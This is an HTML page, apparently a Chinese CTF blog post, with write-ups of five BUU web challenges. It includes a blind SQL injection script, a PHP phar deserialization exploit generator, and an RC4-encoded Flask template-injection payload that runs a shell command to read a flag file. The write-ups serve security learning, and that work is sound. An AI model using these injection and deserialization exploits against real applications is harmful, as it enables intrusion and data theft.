@@ -1,0 +1,387 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>亿周CTF 8 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="亿周CTF 8 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+清理缓存
+
+BUU
+[GYCTF2020]Ezsqli
+涉及一个&gt;的盲注知识点，简单贴下脚本好了
+import requests
+import time
+url = 'http://386ceb21-555e-4aeb-b3d0-f..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              亿周CTF 8
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-14
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/yi-zhou-ctf-8.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>清理缓存</p>
+</blockquote>
+<h1 id="buu">BUU</h1>
+<h2 id="gyctf2020ezsqli">[GYCTF2020]Ezsqli</h2>
+<p>涉及一个<code>&gt;</code>的盲注知识点，简单贴下脚本好了</p>
+<pre><code class="language-python">import requests
+import time
+url = 'http://386ceb21-555e-4aeb-b3d0-fd0d1c592b5f.node4.buuoj.cn:81/index.php'
+# give_grandpa_pa_pa_pa
+
+payload_flag = '1^((select 1,\'{}\')&gt;(select * from f1ag_1s_h3r3_hhhhh))'
+flag = ''
+for i in range(1, 100):
+    time.sleep(0.3)#这里要sleep一下，不然太快了会乱码，本人测试后0.3正好能出结果
+    low = 32
+    high = 128
+    mid = (low + high) // 2
+    while (low &lt; high):
+        k = flag + chr(mid)
+        payload = payload_flag.format(k)
+        data = {&quot;id&quot;: payload}
+        print(payload)
+        r = requests.post(url=url, data=data)
+        if 'Nu1L' in r.text:
+            low = mid + 1
+        else:
+            high = mid
+
+        mid = (low + high) // 2
+
+    # if mid == 33:
+    #     break
+    flag += chr(mid - 1)
+    print(flag.lower())  # 因为出来的flag是大写，这边全部转为小写
+
+print(flag.lower())
+</code></pre>
+<h2 id="swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</h2>
+<p>phar反序列化。</p>
+<p><code>/file.php?file=</code>可以把各个文件读出来，<code>class.php</code>有反序列化的漏洞点，<code>highlight_file</code>用来触发phar的反序列化。</p>
+<p>结题步骤如下：<br>
+�<br>
+生成phar文件，修改后缀名为.jpg</p>
+<pre><code class="language-php">&lt;?php
+class C1e4r
+{
+    public $test;
+    public $str;
+    public function __construct()
+    {
+        $this-&gt;str = new Show();
+    }
+    public function __destruct()
+    {
+        $this-&gt;test = $this-&gt;str;
+        echo $this-&gt;test;
+    }
+}
+
+class Show
+{
+    public $source;
+    public $str;
+    public function __construct()
+    {
+        $this-&gt;str = array('str' =&gt; new Test());
+    }
+}
+class Test
+{
+    public $file;
+    public $params;
+    public function __construct()
+    {
+        $this-&gt;params = array('source' =&gt; '/var/www/html/f1ag.php');
+    }
+
+}
+try {
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new C1e4r();
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+} catch (Exception $e) {
+    // 捕获并打印任何异常
+    echo &quot;Error: &quot; . $e-&gt;getMessage();
+}
+</code></pre>
+<p>上传文件，可以在<code>upload/</code>下查看<br>
+<img src="https://skyblu3519.github.io/post-images/1702545403256.png" alt="" loading="lazy"></p>
+<p>phar反序列化<br>
+<img src="https://skyblu3519.github.io/post-images/1702545413500.png" alt="" loading="lazy"></p>
+<h2 id="网鼎杯-2018comment">[网鼎杯 2018]Comment</h2>
+<p>git源码泄露+二次注入<br>
+git log --all<br>
+<strong>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</strong></p>
+<p>多行sql语句，用/**/注释</p>
+<h2 id="harekazectf2019encode_and_encode">[HarekazeCTF2019]encode_and_encode</h2>
+<pre><code class="language-java">&lt;?php
+error_reporting(0);
+
+if (isset($_GET['source'])) {
+  show_source(__FILE__);
+  exit();
+}
+
+function is_valid($str) {
+  // ......
+}
+
+$body = file_get_contents('php://input');
+$json = json_decode($body, true);
+
+// ......
+</code></pre>
+<p>知识点：<code>json_decode</code>会自动解码unicode</p>
+<p>举个例子<br>
+<img src="https://skyblu3519.github.io/post-images/1702545429341.png" alt="" loading="lazy"></p>
+<p>简单的脚本</p>
+<pre><code class="language-java">def unicode_to_ascii(unicode_str):
+    return unicode_str.encode('utf-8').decode('unicode_escape')
+
+def ascii_to_unicode(ascii_str):
+    return ''.join(f'\\u{ord(c):04x}' for c in ascii_str)
+
+def main():
+    choice = input(&quot;1. Unicode to ASCII\n2. ASCII to Unicode\nChoose (1/2): &quot;)
+
+    if choice == '1':
+        unicode_str = input(&quot;Enter Unicode string (e.g., '\\u0070\\u0068\\u0070'): &quot;)
+        print(&quot;ASCII Result:&quot;, unicode_to_ascii(unicode_str))
+
+    elif choice == '2':
+        ascii_str = input(&quot;Enter ASCII string: &quot;)
+        print(&quot;Unicode Result:&quot;, ascii_to_unicode(ascii_str))
+
+    else:
+        print(&quot;Invalid choice!&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+
+</code></pre>
+<p>使用php://filter读文件<br>
+<img src="https://skyblu3519.github.io/post-images/1702545457211.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1702545463478.png" alt="" loading="lazy"></p>
+<h2 id="ciscn2019-华东南赛区double-secret">[CISCN2019 华东南赛区]Double Secret</h2>
+<p>根据题目提示访问<code>/secret</code>，再带上<code>secret</code>参数<code>/secret?secret=111111111111</code>。结果报错了，在这个debug页面可以看到部分源码<br>
+<img src="https://skyblu3519.github.io/post-images/1702545473023.png" alt="" loading="lazy"></p>
+<p>对secret的内容RC4解码后（密钥也给了）用模版进行了渲染，这里用safe() 函数标记<code>deS</code>字符串为“安全”，这意味着 Flask 的模板引擎不会对这个字符串进行 HTML 转义处理。</p>
+<p>SSTI注入，只需要知道RC4的加密怎么写就行，脚本参考：<a href="https://blog.csdn.net/nicesa/article/details/107428983">https://blog.csdn.net/nicesa/article/details/107428983</a></p>
+<pre><code class="language-python">import base64
+from urllib.parse import quote
+
+
+def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):
+    # print(&quot;RC4加密主函数&quot;)
+    s_box = rc4_init_sbox(key)
+    crypt = str(rc4_excrypt(message, s_box))
+    return  crypt
+
+
+def rc4_init_sbox(key):
+    s_box = list(range(256))  
+    # print(&quot;原来的 s 盒：%s&quot; % s_box)
+    j = 0
+    for i in range(256):
+        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
+        s_box[i], s_box[j] = s_box[j], s_box[i]
+    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)
+    return s_box
+
+
+def rc4_excrypt(plain, box):
+    # print(&quot;调用加密程序成功。&quot;)
+    res = []
+    i = j = 0
+    for s in plain:
+        i = (i + 1) % 256
+        j = (j + box[i]) % 256
+        box[i], box[j] = box[j], box[i]
+        t = (box[i] + box[j]) % 256
+        k = box[t]
+        res.append(chr(ord(s) ^ k))
+    cipher = &quot;&quot;.join(res)
+    print(&quot;加密后的字符串是：%s&quot; % quote(cipher))
+    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
+
+
+plain = &quot;{{''.__class__.__base__.__base__.__subclasses__()[239]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}&quot;
+rc4_main(&quot;HereIsTreasure&quot;, plain)
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#buu">BUU</a>
+<ul>
+<li><a href="#gyctf2020ezsqli">[GYCTF2020]Ezsqli</a></li>
+<li><a href="#swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</a></li>
+<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018comment">[网鼎杯 2018]Comment</a></li>
+<li><a href="#harekazectf2019encode_and_encode">[HarekazeCTF2019]encode_and_encode</a></li>
+<li><a href="#ciscn2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAdouble-secret">[CISCN2019 华东南赛区]Double Secret</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/2023polarctf-dong-ji-sai-web-wp/">
+              <h3 class="post-title">
+                [2023PolarCTF冬季赛]WEB WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
